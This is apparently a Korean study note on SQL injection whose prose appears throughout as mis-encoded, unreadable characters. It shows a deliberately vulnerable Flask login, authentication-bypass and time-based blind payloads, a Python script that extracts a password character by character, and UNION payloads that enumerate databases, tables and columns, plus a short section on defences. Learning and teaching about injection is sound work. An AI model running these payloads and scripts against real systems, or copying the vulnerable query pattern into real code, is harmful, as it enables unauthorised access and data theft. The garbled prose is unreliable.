---
title: "[2025-07-11] SQL Injection"
excerpt: "SQL Injection ê°œë… ì •ë¦¬"

categories:
  - Justice
tags:
  - [SQL Injection]

permalink: /Justice/[2025-07-11] SQL Injection/

toc: true
toc_sticky: true

date: 2025-07-11
last_modified_at: 2025-07-11
---

## ğŸ¦¥ ë³¸ë¬¸

### ì •ì˜

ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì…ë ¥ê°’ì„ í†µí•´ SQL ì¿¼ë¦¬ë¥¼ ì¡°ì‘í•˜ëŠ” ê³µê²©

### ì˜ˆì‹œ

```jsx
from flask import Flask, request
import mysql.connector

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    db = mysql.connector.connect(
        host="localhost",
        user="root",
        password="password",
        database="mydb"
    )

    cursor = db.cursor()

    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)

    result = cursor.fetchone()

    if result:
        return "Login Success!"
    else:
        return "Login Failed"

if __name__ == "__main__":
    app.run(debug=True)
```

ìœ„ì˜ ì½”ë“œì—ì„œ **`usernameì— 'OR 1=1 --`** ë¡œ í•˜ê²Œ ëœë‹¤ë©´

```jsx
SELECT * FROM users WHERE username= " OR 1=1 --'AND password= '[ì…ë ¥ê°’]'; 
```

ìœ„ì™€ ê°™ì´ ì„œë²„ê°€ ì½ì–´ë“œë¦¬ê²Œ ëœë‹¤. -- ë’¤ë¡œëŠ” ë‹¤ ì£¼ì„ ì²˜ë¦¬ê°€ ë˜ë¯€ë¡œ ë¡œê·¸ì¸ì´ ì„±ê³µí•œë‹¤.

### ëŒ€ì‘ ë°©ë²•

1. Prepared Statements : íŒŒë¼ë¯¸í„°ë¥¼ í†µí•œ ë°”ì¸ë”© ì‚¬ìš©

```jsx
await psql.query(`
    SELECT CU.idx, CU.role, CM.interest_idx, CI.interest
    FROM calenduck.login CL
    JOIN calenduck.user CU
    ON CL.idx = CU.login_idx 
    LEFT JOIN calenduck.manager CM ON CU.idx = CM.user_idx
    LEFT JOIN calenduck.interest CI ON CM.interest_idx = CI.idx
    WHERE CL.id = $1 AND CL.pw = $2
  `, [id, pw]);
```

1. ORM(Object-Relational Mapping) : SQL ì§ì ‘ ì‘ì„±í•˜ì§€ ì•Šê³  ORM ì‚¬ìš©
    - ORM : ê°ì²´ì™€ ë°ì´í„°ë² ì´ìŠ¤ì˜ í…Œì´ë¸”ì„ ìë™ìœ¼ë¡œ ì—°ê²°í•´ì£¼ëŠ” ê¸°ìˆ 
    
    ```jsx
     user = db.session.query(User).filter_by(id=user_id).first()
    ```
    
2. ì…ë ¥ ê°’ ê²€ì¦ ë° í™”ì´íŠ¸ ë¦¬ìŠ¤íŠ¸ ì‚¬ìš©
3. ì˜¤ë¥˜ ë©”ì‹œì§€ ìˆ¨ê¸°ê¸°
4. ê¶Œí•œ ìµœì†Œí™”

## Blind SQL Injection

### ì •ì˜

ê³µê²©ìê°€ ì‘ë‹µì˜ ë³€í™”ë¥¼ í†µí•´ ê°„ì ‘ì ìœ¼ë¡œ SQL ê²°ê³¼ë¥¼ ì¶”ì¸¡í•˜ëŠ” ë°©ì‹ì˜ ê³µê²©

### ì¢…ë¥˜

- Boolean-based Blind : ì¡°ê±´ì´ ì°¸/ê±°ì§“ì¼ ë•Œ í˜ì´ì§€ ë‚´ìš©ì´ ë‹¬ë¼ì§€ëŠ”ì§€ ë¹„êµ
- Time-based Blind : ì¡°ê±´ì´ ì°¸ì´ë©´ ì¼ë¶€ëŸ¬ sleep() ë“±ìœ¼ë¡œ ì„œë²„ ë°˜ì‘ì„ ì§€ì—°ì‹œí‚´

### ì˜ˆì‹œ

ì•„ë˜ì™€ ê°™ì€ SQLë¬¸ì„ ë™ì‘ì‹œí‚¤ëŠ” ì„œë²„ê°€ ìˆë‹¤ê³  ê°€ì •. Time-based Blind ë°©ì‹ ê³µê²©

```jsx
SELECT * FROM users WHERE username = '{username}' AND password = '{password}'
```

1. ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ ì•Œì•„ë‚´ê¸°. ì•„ë˜ì˜ ì½”ë“œì—ì„œ LENGTHì˜ ê¸¸ì´ë¥¼ ì ì  ëŠ˜ë ¤ì„œ ì•Œì•„ë‚¸ë‹¤.

```jsx
admin' AND IF(LENGTH(password)=8, SLEEP(5), 0)--
```

1. ê¸¸ì´ë¥¼ ì•Œì•„ëƒˆë‹¤ë©´ í•œ ê¸€ìì”© ì•Œì•„ë‚´ê¸°. ë§ë‹¤ë©´ ì‘ë‹µì´ ì§€ì—°ë˜ê¸° ë•Œë¬¸ì— ì´ëŸ° ë°©ì‹ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ë¡ í•œë‹¤.

```jsx
admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
```

### ê³µê²© ìŠ¤í¬ë¦½íŠ¸ : Requset ëª¨ë“ˆ

- GET ë°©

```jsx
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
params = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)
```

- POST ë°©ì‹

```jsx
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
data = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```

- GET ë°©ì‹. ëª¨ë“  ë¬¸ìì—´ì— ëŒ€í•œ Blind SQLi ì‹¤í–‰

```jsx
#!/usr/bin/python3
import requests
import string
# example URL
url = 'http://example.com/login'
params = {
    'uid': '',
    'upw': ''
}
# ascii printables
tc = string.printable
# ì‚¬ìš©í•  SQL Injection ì¿¼ë¦¬
query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
password = ''
# ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ëŠ” 20ì ì´í•˜ë¼ ê°€ì •
for idx in range(0, 20):
    for ch in tc:
        # queryë¥¼ ì´ìš©í•˜ì—¬ Blind SQL Injection ì‹œë„
        params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        # ì‘ë‹µì— Login success ë¬¸ìì—´ì´ ìˆìœ¼ë©´ í•´ë‹¹ ë¬¸ìë¥¼ password ë³€ìˆ˜ì— ì €ì¥
        if c.text.find("Login success") != -1:
            password += ch
            break
print(f"Password is {password}")
```

## Error Based SQLi

### ì •ì˜

SQLì˜ ì˜ëª»ëœ ë¬¸ë²•ì´ë‚˜ ìë£Œí˜• ë¶ˆì¼ì¹˜ ë“±ì— ì˜í•œ ì˜¤ë¥˜ ë©”ì‹œì§€ì— ì˜ì¡´í•˜ì—¬ ìˆ˜í–‰ë˜ëŠ” ê³µê²© ê¸°ë²•

### ë™ì‘ íë¦„

![image.png](https://yunseo10987.github.io/assets/images/posts_img/2025-07-11%20SQLi/image.png)

1. HTTP ìš”ì²­
2. ì „ë‹¬ ë°›ì€ íŒŒë¼ë¯¸í„°ì˜ ê°’ì„ SQL ì¿¼ë¦¬ì— ëŒ€ì…
3. SQL ì¿¼ë¦¬ ì‹¤í–‰ ìš”ì²­
4. ì˜¤ë¥˜ ë©”ì‹œì§€ ë°˜í™˜
5. DB ì˜¤ë¥˜ ë©”ì‹œì§€ì™€ í•¨ê»˜ HTTP ì‘ë‹µ
6. DB ì •ë³´ íšë“ 

- ë°ì´í„°ë² ì´ìŠ¤ ë³„ ê³µê²© ê¸°ë²•ì€ ë‹¤ìŒ ë§í¬ì—ì„œ ì•Œ ìˆ˜ ìˆë‹¤.

https://www.bugbountyclub.com/pentestgym/view/53

### Union Syntax

Union ê¸°ë°˜ì˜ ê³µê²© ë°©ë²•ìœ¼ë¡œ ë‹¤ë¥¸ í…Œì´ë¸”ì˜ ê³µê²©ë„ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì— ê°€ì¥ ìœ„í—˜í•œ ê³µê²© ì¤‘ í•˜ë‚˜ì´ë‹¤.  

ë™ì‘ ë°©ì‹

- ORDER BY 1ì€ ì²«ë²ˆì§¸ ì»¬ëŸ¼ì„ ì˜¤ë¦„ì°¨ìˆœ ì •ë ¬í•˜ì—¬ ì¶œë ¥í•˜ëŠ” ê²ƒ. ë’¤ì— ìˆ«ìë¥¼ ì ì  í‚¤ì›Œì„œ ì»¬ëŸ¼ì˜ ê°¯ìˆ˜ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤.

```
?idx=ì„ì˜ì˜ ë¬¸ìì—´'+UNION+ALL+SELECT+'a',+NULL,+NULL--+
?idx=ì„ì˜ì˜ ë¬¸ìì—´'+UNION+ALL+SELECT+NULL,+'a',+NULL--+
?idx=ì„ì˜ì˜ ë¬¸ìì—´'+UNION+ALL+SELECT+NULL,+NULL,+'a'--+
...
```

- ìœ„ì˜ ì½”ë“œë¥¼ ì‚¬ìš©í•´ì„œ ë§Œì•½ ì—ëŸ¬ê°€ ë°œìƒí•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ í•´ë‹¹ ì»¬ëŸ¼ì€ ë¬¸ìì—´ì„ ë°›ì„ ìˆ˜ ìˆëŠ” ê²ƒ ì—ëŸ¬ê°€ ë°œìƒí•œë‹¤ë©´ ë‹¤ë¥¸ íƒ€ì…
- ë°ì´í„°ë² ì´ìŠ¤ëª…ì„ ë°˜í™˜í•˜ëŠ” database() í•¨ìˆ˜

```
?idx=ì„ì˜ì˜ ë¬¸ìì—´'+UNION+ALL+SELECT+database(),2,3--+
```

- ëª¨ë“  í…Œì´ë¸” ì´ë¦„ ì¶”ì¶œì„ í•˜ëŠ” group_concat(table_name) í•¨ìˆ˜

```
?idx=ì„ì˜ì˜ ë¬¸ìì—´'+UNION+ALL+SELECT+group_concat(table_name),2,3+FROM+information_schema.TABLES+WHERE+table_schema=database()--+

+information_schema.TABLES ëŠ” ëª¨ë“  DBì˜ í…Œì´ë¸” ì •ë³´ë¥¼ ì €ì¥í•˜ëŠ” ì‹œìŠ¤í…œ í…Œì´ë¸”
WHERE+table_schema=database()ëŠ” í˜„ì¬ DBì˜ í…Œì´ë¸”ë“¤ë§Œ ì¡°íšŒ
```

- ì»¬ëŸ¼ ì¶”ì¶œ
- group_concat(column_name)ì€ ì§€ì •í•œ í…Œì´ë¸”ì˜ ëª¨ë“  ì»¬ëŸ¼ ì´ë¦„ì„ ì½¤ë§ˆë¡œ ì—°ê²°í•˜ì—¬ ë°˜í™˜.

```
?idx=ì„ì˜ì˜ ë¬¸ìì—´'+UNION+ALL+SELECT+group_concat(column_name),2,3+FROM+information_schema.COLUMNS+WHERE+table_schema=database()+AND+table_name='í…Œì´ë¸”ëª…'--+
```

ìœ„ì˜ ë°©ë²•ë“¤ë¡œ ë‹¤ë¥¸ í…Œì´ë¸”ì„ ì•Œì•„ë‚´ì–´ ë‹¤ë¥¸ í…Œì´ë¸”ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.

+https://www.bugbountyclub.com/pentestgym/view/54